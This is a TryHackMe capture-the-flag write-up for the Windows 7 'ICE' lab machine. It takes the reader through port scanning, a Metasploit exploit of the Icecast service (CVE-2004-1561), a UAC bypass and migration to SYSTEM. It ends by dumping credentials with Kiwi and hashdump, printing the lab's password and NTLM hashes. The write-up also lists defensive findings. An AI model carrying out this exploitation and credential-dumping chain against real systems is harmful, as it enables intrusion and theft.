# TryHackMe — ICE

> **Platform:** TryHackMe
> **Machine:** ICE
> **Difficulty:** Easy
> **Operating System:** Windows 7 Professional SP1
> **Target IP:** `10.48.135.66`
> **Hostname:** `DARK-PC`
> **Workgroup:** `WORKGROUP`

---

## Table of Contents

* [1. Machine Overview](#1-machine-overview)
* [2. Initial Enumeration](#2-initial-enumeration)
* [3. Service and Version Detection](#3-service-and-version-detection)
* [4. SMB Enumeration](#4-smb-enumeration)
* [5. Icecast Enumeration](#5-icecast-enumeration)
* [6. Exploitation](#6-exploitation)
* [7. Initial Shell](#7-initial-shell)
* [8. Windows Enumeration](#8-windows-enumeration)
* [9. Local Privilege Escalation](#9-local-privilege-escalation)
* [10. UAC Bypass](#10-uac-bypass)
* [11. SYSTEM Access](#11-system-access)
* [12. Credential Dumping](#12-credential-dumping)
* [13. NTLM Hashes](#13-ntlm-hashes)
* [14. Attack Path Summary](#14-attack-path-summary)
* [15. Key Findings](#15-key-findings)
* [16. Lessons Learned](#16-lessons-learned)

---

# 1. Machine Overview

The **ICE** machine is a Windows-based TryHackMe challenge.

The target exposes several Windows services, including SMB, RDP, RPC, and an **Icecast streaming media server** running on port `8000`.

The initial goal was to enumerate the exposed services and identify a possible attack vector.

### Target Information

| Information                 | Value                      |
| --------------------------- | -------------------------- |
| Target IP                   | `10.48.135.66`             |
| Hostname                    | `DARK-PC`                  |
| Operating System            | Windows 7 Professional SP1 |
| Workgroup                   | `WORKGROUP`                |
| Primary Interesting Service | Icecast                    |
| Icecast Port                | `8000/tcp`                 |

---

# 2. Initial Enumeration

The first step was a full TCP port scan against the target.

### Nmap Scan

```bash
nmap -p- 10.48.135.66
```

### Open Ports

```text
135/tcp    open    msrpc
139/tcp    open    netbios-ssn
445/tcp    open    microsoft-ds
3389/tcp   open    ms-wbt-server
5357/tcp   open    wsdapi
8000/tcp   open    http-alt
49152/tcp  open    unknown
49153/tcp  open    unknown
49154/tcp  open    unknown
49160/tcp  open    unknown
49183/tcp  open    unknown
49184/tcp  open    unknown
```

The most interesting ports were:

* `445` — SMB
* `3389` — RDP
* `8000` — HTTP / Icecast
* `135` — MSRPC
* `139` — NetBIOS

The Icecast service on port `8000` stood out as a potential attack surface.

---

# 3. Service and Version Detection

Next, service and version detection was performed.

```bash
nmap -sC -sV 10.48.135.66
```

The scan identified the target as:

```text
Windows 7 Professional 7601 Service Pack 1
```

The hostname was also identified:

```text
DARK-PC
```

### Important Services

```text
135/tcp   Microsoft Windows RPC
139/tcp   Microsoft Windows NetBIOS
445/tcp   Windows SMB
3389/tcp  RDP
5357/tcp  Microsoft HTTPAPI 2.0
8000/tcp  Icecast streaming media server
```

The most important discovery was:

```text
8000/tcp open http Icecast streaming media server
```

The scan also showed that SMB message signing was **disabled**:

```text
message_signing: disabled
```

SMB authentication was also possible using the guest account:

```text
account_used: guest
```

The SMB configuration was therefore worth investigating further.

---

# 4. SMB Enumeration

The first SMB enumeration attempt used `enum4linux`.

However, it did not reveal much useful information.

The next step was to attempt anonymous SMB enumeration using `smbclient`.

```bash
smbclient -L 10.48.135.66 -N
```

The result showed:

```text
Anonymous login successful
```

However, attempting to enumerate the available shares did not provide useful share information.

```text
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.48.135.66 failed
Error NT_STATUS_RESOURCE_NAME_NOT_FOUND

Unable to connect with SMB1 -- no workgroup available
```

At this point, SMB did not provide a direct path forward.

The next focus was therefore the Icecast service.

---

# 5. Icecast Enumeration

Port `8000` was running:

```text
Icecast streaming media server
```

This was an interesting finding because older versions of Icecast have known vulnerabilities.

Further investigation identified:

**CVE-2004-1561**

The vulnerability was associated with Icecast and could potentially allow remote code execution.

The vulnerability reference used during the investigation:

```text
CVE-2004-1561
```

The presence of Icecast on the target therefore provided a promising initial access vector.

---

# 6. Exploitation

The Icecast vulnerability was exploited using Metasploit.

The relevant Metasploit module was:

```text
exploit/windows/http/icecast_header
```

The required options were configured.

### Configure LHOST

```text
set LHOST 192.168.138.6
```

### Configure RHOSTS

```text
set RHOSTS 10.48.135.66
```

Then the exploit was launched:

```text
exploit
```

The exploit successfully provided a shell on the target.

---

# 7. Initial Shell

After exploitation, a shell was obtained on the target.

The working directory was:

```text
C:\Program Files (x86)\Icecast2 Win32
```

This confirmed that the Icecast service was running from:

```text
C:\Program Files (x86)\Icecast2 Win32
```

At this point, the next objective was to improve shell stability and enumerate the Windows system for privilege escalation opportunities.

The shell was therefore moved toward a more capable PowerShell/Meterpreter environment.

---

# 8. Windows Enumeration

The operating system information was checked using:

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

The result was:

```text
OS Name:     Microsoft Windows 7 Professional
OS Version:  6.1.7601 Service Pack 1 Build 7601
```

This confirmed that the target was running:

> **Windows 7 Professional Service Pack 1**

Because Windows 7 is an old operating system, several local privilege escalation possibilities were worth checking.

---

# 9. Local Privilege Escalation

Since a Meterpreter session was available, the Metasploit local exploit suggester was used.

First, the session was placed in the background.

Then:

```text
run post/multi/recon/local_exploit_suggester
```

Metasploit performed numerous vulnerability checks.

```text
255 exploit checks are being tried...
```

Several possible privilege escalation vectors were identified.

### Notable Findings

```text
exploit/windows/local/bypassuac_comhijack
```

The target appeared vulnerable to the UAC bypass.

Another identified option was:

```text
exploit/windows/local/bypassuac_eventvwr
```

The target also appeared vulnerable to this technique.

Another interesting result was:

```text
exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move
```

The service was detected, although the vulnerability could not be fully validated.

Metasploit also identified:

```text
exploit/windows/local/ms10_092_schelevator
```

as another potential privilege escalation path.

The `bypassuac_eventvwr` module was selected for the privilege escalation attempt.

---

# 10. UAC Bypass

The selected exploit was:

```text
exploit/windows/local/bypassuac_eventvwr
```

The existing Meterpreter session was configured:

```text
set session 1
```

The listener address was configured:

```text
set LHOST 192.168.138.6
```

After configuring the required options, the exploit was executed.

The privilege escalation was successful.

---

# 11. SYSTEM Access

After privilege escalation, the available process privileges were checked.

```text
getprivs
```

Several powerful Windows privileges were available.

Notable privileges included:

```text
SeBackupPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege
```

Of particular interest was:

```text
SeTakeOwnershipPrivilege
```

This privilege can allow a process to take ownership of objects and files when the appropriate permissions are available.

The next step was to migrate the Meterpreter session into a process running with stronger privileges.

The process list was inspected using:

```text
ps
```

A process associated with the Windows Print Spooler was selected:

```text
spoolsv.exe
```

The Meterpreter session was migrated using:

```text
migrate -N spoolsv.exe
```

After migration, the current identity was checked:

```text
getuid
```

The result was:

```text
Server username: NT AUTHORITY\SYSTEM
```

This confirmed successful escalation to:

# `NT AUTHORITY\SYSTEM`

At this point, full administrative control of the Windows machine had been obtained.

---

# 12. Credential Dumping

With SYSTEM-level privileges established, credential extraction was performed using Meterpreter's Kiwi extension.

The extension was loaded using:

```text
load kiwi
```

The available Kiwi functionality was then examined.

The `creds_all` command was used to retrieve stored credentials.

```text
creds_all
```

The output revealed credentials associated with the `Dark` user.

### WDigest Credentials

```text
Username     Domain     Password
-----------------------------------------
Dark         Dark-PC    Password01!
```

### TSPKG Credentials

```text
Username     Domain     Password
-----------------------------------------
Dark         Dark-PC    Password01!
```

### Kerberos Credentials

```text
Username     Domain     Password
-----------------------------------------
Dark         Dark-PC    Password01!
```

This demonstrated the impact of obtaining SYSTEM-level access on an older Windows system.

---

# 13. NTLM Hashes

The local password hashes were also retrieved using:

```text
hashdump
```

The result included:

```text
Administrator:500:aad3b435b51404eead3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Dark:1000:aad3b435b51404eead3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
Guest:501:aad3b435b51404eead3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

The important account was:

```text
Dark
```

with the NTLM hash:

```text
7c4fe5eada682714a036e39378362bab
```

The previously recovered plaintext credential was:

```text
Password01!
```

> **Note:** These credentials and hashes are reproduced here because they were part of the isolated TryHackMe lab environment. They should never be reused against systems without explicit authorization.

---

# 14. Attack Path Summary

The complete attack chain can be summarized as:

```text
Target Discovery
      │
      ▼
Full Port Scan
      │
      ▼
Service Enumeration
      │
      ├── SMB
      ├── RDP
      ├── RPC
      │
      └── Icecast :8000
              │
              ▼
       Icecast Enumeration
              │
              ▼
        CVE-2004-1561
              │
              ▼
       Remote Code Execution
              │
              ▼
       Initial Meterpreter
              │
              ▼
      Windows Enumeration
              │
              ▼
  Local Exploit Suggester
              │
              ▼
      UAC Bypass EventVwr
              │
              ▼
       Privilege Escalation
              │
              ▼
       Process Migration
              │
              ▼
      NT AUTHORITY\SYSTEM
              │
              ▼
        Load Kiwi
              │
              ▼
       Credential Extraction
              │
              ▼
      Passwords + NTLM Hashes
```

---

# 15. Key Findings

## 15.1 Outdated Operating System

The target was running:

```text
Windows 7 Professional SP1
```

Windows 7 is a legacy operating system and contains numerous historical vulnerabilities.

Keeping unsupported operating systems in production significantly increases security risk.

---

## 15.2 Vulnerable Icecast Service

The machine exposed:

```text
8000/tcp
```

running:

```text
Icecast streaming media server
```

The vulnerable service provided the initial remote code execution vector.

This demonstrates why externally exposed services must be:

* Properly patched
* Version controlled
* Regularly audited
* Disabled when unnecessary

---

## 15.3 Weak SMB Configuration

SMB enumeration showed:

```text
Anonymous login successful
```

and:

```text
message_signing: disabled
```

Although SMB did not directly provide the initial foothold in this attack path, this configuration represents additional security weaknesses.

---

## 15.4 Multiple Local Privilege Escalation Opportunities

The local exploit suggester identified several possible privilege escalation vectors.

The successful path used:

```text
bypassuac_eventvwr
```

This highlights the importance of maintaining current Windows security patches and properly configuring UAC.

---

## 15.5 SYSTEM-Level Compromise

After privilege escalation and process migration:

```text
getuid
```

returned:

```text
NT AUTHORITY\SYSTEM
```

This represented complete compromise of the target operating system.

---

## 15.6 Credential Exposure

After obtaining SYSTEM privileges, credential material was accessible.

The investigation recovered:

```text
Dark : Password01!
```

as well as the user's NTLM hash.

This demonstrates how a compromise of a highly privileged Windows process can lead to credential theft and further compromise.

---

# 16. Lessons Learned

This machine demonstrated a complete Windows exploitation chain:

### 1. Enumerate First

A full port scan quickly identified the available attack surface.

```bash
nmap -p- 10.48.135.66
```

### 2. Identify Versions

Service and version detection revealed the operating system and Icecast service.

```bash
nmap -sC -sV 10.48.135.66
```

### 3. Prioritize Interesting Services

Instead of spending excessive time on SMB after limited enumeration results, attention was shifted toward the unusual Icecast service on port `8000`.

### 4. Research Known Vulnerabilities

The Icecast version/service information led to the identification of:

```text
CVE-2004-1561
```

### 5. Establish Initial Access

The vulnerable Icecast service provided remote code execution and a Meterpreter session.

### 6. Enumerate After Compromise

Once inside the system, the Windows version and available privileges were investigated.

### 7. Search for Privilege Escalation

Metasploit's local exploit suggester helped identify potential local privilege escalation paths.

```text
run post/multi/recon/local_exploit_suggester
```

### 8. Escalate Privileges

The `bypassuac_eventvwr` technique was used successfully.

### 9. Migrate to a Privileged Process

The session was migrated into:

```text
spoolsv.exe
```

resulting in:

```text
NT AUTHORITY\SYSTEM
```

### 10. Understand the Impact

SYSTEM-level access allowed credential material and NTLM hashes to be extracted.

---

# Final Attack Chain

```text
Nmap
  ↓
Port 8000
  ↓
Icecast
  ↓
CVE-2004-1561
  ↓
Remote Code Execution
  ↓
Meterpreter
  ↓
Windows 7 Enumeration
  ↓
Local Exploit Suggester
  ↓
UAC Bypass
  ↓
Process Migration
  ↓
NT AUTHORITY\SYSTEM
  ↓
Kiwi / Credential Extraction
  ↓
Passwords + NTLM Hashes
```

---

# Conclusion

The **TryHackMe ICE** machine provided a practical demonstration of how an attacker can move from basic network enumeration to complete Windows system compromise.

The attack started with identifying an exposed **Icecast service**, followed by exploitation of a known vulnerability to obtain initial access. After gaining a shell, further Windows enumeration revealed several possible privilege escalation opportunities.

Using the `bypassuac_eventvwr` technique followed by process migration, the session was elevated to:

```text
NT AUTHORITY\SYSTEM
```

With SYSTEM privileges, credential material and NTLM hashes could then be recovered.

The main lesson from this machine is that **initial access is only one stage of a penetration test**. Proper post-exploitation enumeration, privilege escalation analysis, process inspection, and understanding Windows security boundaries are equally important.

> **Attacker's perspective:** Enumerate → Identify → Exploit → Enumerate Again → Escalate → Validate Impact

> **Defender's perspective:** Patch → Minimize Exposure → Harden Services → Enforce Least Privilege → Monitor → Detect

---

## Tools Used

* `Nmap`
* `enum4linux`
* `smbclient`
* `Metasploit Framework`
* `Meterpreter`
* `Kiwi / Mimikatz`

---

## Skills Practiced

* Network Enumeration
* Service Enumeration
* SMB Enumeration
* Vulnerability Identification
* Exploit Research
* Remote Code Execution
* Windows Post-Exploitation
* Local Privilege Escalation
* UAC Bypass
* Process Migration
* SYSTEM-Level Access
* Credential Extraction
* NTLM Hash Enumeration
* Windows Security Assessment

---

## Disclaimer

This write-up is intended for **authorized cybersecurity training and educational purposes**, specifically within the TryHackMe lab environment.

Do not use these techniques, exploits, credentials, or commands against systems that you do not own or do not have explicit permission to test.
